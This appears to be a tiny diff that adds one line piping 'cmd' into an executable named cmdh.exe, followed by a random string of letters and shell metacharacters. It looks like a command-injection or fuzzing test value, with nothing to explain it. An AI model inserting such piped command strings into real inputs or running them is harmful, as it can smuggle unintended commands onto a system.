@@ -1,0 +1,1 @@
+cmd | cmdh.exe ABGHJYJYwfeJIU482Y@#^&$&
